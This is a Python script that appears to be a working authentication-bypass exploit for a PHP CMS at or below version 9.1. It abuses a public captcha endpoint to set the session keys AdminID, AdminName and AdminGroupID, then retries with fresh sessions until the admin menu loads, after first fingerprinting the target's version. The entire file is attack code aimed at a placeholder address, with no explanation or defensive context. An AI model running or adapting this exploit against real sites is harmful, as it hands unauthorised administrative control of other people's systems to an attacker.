import requests
def session(target,sessions):
    sessions.get(target+"/index.php/Admin/public/Login")
    sessions.get(target +"/index.php/public/verifyCode?length=2&mode=1&width=22&height=22&verify=AdminID&type=png")
    sessions.get(target +"/index.php/public/verifyCode?length=2&mode=1&width=22&height=22&verify=AdminName&type=png")
    sessions.get(target +"/index.php/public/verifyCode?length=2&mode=1&width=22&height=22&verify=AdminGroupID&type=png")
    res = sessions.get(target +"/index.php/Admin/Public/AdminLeft/MenuTopID/7",allow_redirects=False)    
    if '模板' in res.text:        
        print(f'{sessions.cookies.get_dict()}  yes')
        return True
    else:
        print(f'{sessions.cookies.get_dict()}  no')
    
    
if __name__ == '__main__':
    target='http://x.x.x.x'
    print("-"*10 + "=<V9.1" + "-"*10)
    VersionURL = target + '/index.php/base?a=Version'
    res_version = requests.get(VersionURL)
    print("-"*11 + res_version.text + "-"*11)   
    
    while True:
        sessions = requests.session()
        if session(target,sessions):
            break
